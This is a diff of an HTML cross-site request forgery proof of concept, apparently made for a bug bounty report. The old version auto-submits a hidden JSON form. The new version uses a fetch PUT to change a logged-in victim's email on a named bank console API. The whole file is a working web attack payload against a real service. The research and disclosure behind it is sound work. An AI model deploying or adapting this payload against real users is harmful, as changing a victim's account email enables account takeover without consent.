@@ -1,10 +1,27 @@
-<html>
-  <body>
-    <form action="https://grantid-console.bancointer.com.br/Api/Users/Email" method="POST" enctype="text/plain">
-      <input type="hidden" name="{\"email\": bruzistico_+test12@wearehackerone.com,\"foo" value="\":\"bar\"}"/>
-    </form>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
     <script>
-      document.forms[0].submit();
+        fetch("https://grantid-console.bancointer.com.br/Api/Users/Email", {
+            method: "PUT",
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json, text/plain, */*",
+            },
+            body: JSON.stringify({
+                "email": "bruzistico_+poccsrf@wearehackerone.com"
+            })
+        }).then(response => {
+            console.log("CSRF exploit attempted:", response.status);
+        }).catch(err => {
+            console.error("CSRF exploit failed:", err);
+        });
     </script>
-  </body>
+</body>
 </html>
